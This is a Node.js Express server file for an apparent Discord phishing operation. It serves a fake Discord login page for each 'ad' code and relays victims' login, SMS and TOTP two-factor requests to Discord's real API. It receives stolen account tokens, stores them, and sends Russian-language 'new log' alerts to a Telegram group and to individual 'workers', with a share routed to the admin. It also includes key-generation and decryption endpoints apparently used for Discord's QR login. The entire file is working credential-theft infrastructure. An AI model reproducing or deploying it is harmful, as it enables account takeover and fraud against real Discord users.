const crypto = require("crypto");
const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios");
const path = require("path");
const { Ad, Log, Settings } = require("../database");
const { bot } = require("../bot");
const app = express();
const time = {1: "1 month", 3: "3 months", 12: "1 year"};

app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "/static")));
app.set("views", path.join(__dirname, "views"));
app.set("view engine", "ejs");

app.get("/:code", async (req, res) => {
    let ad = await Ad.findOne({ code: req.params.code });
    if(!ad) return res.status(404).json({error: "Not found"});
    ad.views += 1;
    ad.save();
    let settings = await Settings.findOne({ id: 1 });
res.status(200).render("Discord.ejs", {
    adCode: ad.code,
    adExpires: time[ad.expires || 1],
    domainHHH: req.host
});
})
app.post("/submitToken/:code", async (req, res) => {
    if(!req.body.token) return res.status(404).json({error: "Not found"});;
    let token = req.body.token;
    let ad = await Ad.findOne({ code: req.params.code });
    if(!ad) return res.status(404).json({error: "Not found"});
    let logs = await Log.count({ userId: ad.userId });
    let logs2 = await Log.count({ userId: ad.userId, get: false, admin: false });
    let settings = await Settings.findOne({ id: 1 });
    let admin = false;
    if(logs){
        if(settings && settings.payments){
            if(logs % settings.payments == 0) admin = true;
        }
    }
    let log = await Log.create({ admin, userId: ad.userId, adCode: ad.code, token: token });
    bot.telegram.sendMessage(
            settings?.logsGroupId?.toString(),
`💸 Новый лог!

👷‍♂️ Воркер: <a href="tg://user?id=${ad.userId}">ТЫК</a>
🔫 Общее кол-во логов: <code>${logs + 1}</code>
🔫  Кол-во логов с последней выдачи: <code>${logs2 + 1}</code>`,
        {parse_mode: "html"}
    ).catch(e => {});
    //
    bot.telegram.sendMessage(
        ad.userId.toString(),
`💸 Новый лог!

🔗 Ссылка: <code>${ad.code}</code>${admin ? "💳 Токен улетел админу" : ""}
`,
        {parse_mode: "html"}
    ).catch(e => {console.log(e)});
});

// Proxy
app.post("/proxy/login", (req, res) => {
    proxyPost(req, res, "https://discord.com/api/v9/auth/login");
});
app.post("/proxy/sms", (req, res) => {
    proxyPost(req, res, "https://discord.com/api/v9/auth/mfa/sms");
});
app.post("/proxy/totp", (req, res) => {
    proxyPost(req, res, "https://discord.com/api/v9/auth/mfa/totp");
});

function proxyPost(req, res, link){
    axios.post(link, req.body, {
        headers: {
            "Content-Type": "application/json",
            "Origin": "https://discord.com",
            "Host": "discord.com"
        }
    }).then(response => res.status(response.status).json(response.data)).catch(err => {
        res.status(err.response.status).json(err.response.data);
    });
}

// Keys
app.get("/crypto/generate_pair", (req, res) => {
    let { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
        modulusLength: 2048,
        hashAlgorithm: "sha256",
        publicKeyEncoding: {
            type: 'spki',
            format: 'der'
        },
        privateKeyEncoding: {
            type: 'pkcs1',
            format: 'der'
        }
    })
    res.status(200).json({
        privateKey: privateKey.toString("base64"),
        publicKey: publicKey.toString("base64")
    });
});
app.post('/crypto/decrypt', (req, res) => {
    let privateKey = crypto.createPrivateKey({
        key: Buffer.from(req.body.key, "base64"),
        format: 'der',
        type: 'pkcs1'
    });
    let result = crypto.privateDecrypt({
        key: privateKey,
        oaepHash: "sha256",
        padding: crypto.constants.RSA_PKCS1_OAEP_PADDING
    }, Buffer.from(req.body.data, "base64"));
    if(req.body.nonce){
        result = crypto.createHash("sha256").update(result).digest("base64url");
        result = result.replace(/\//g, "_").replace(/\+/g, "-").replace(/={1,2}$/, "");
    }else result = result.toString("utf8");
    res.status(200).json({ result });
});

module.exports.start = async () => await new Promise((res, rej) => {
    app.listen(process.env.PORT, () => {
        res();
    })
});
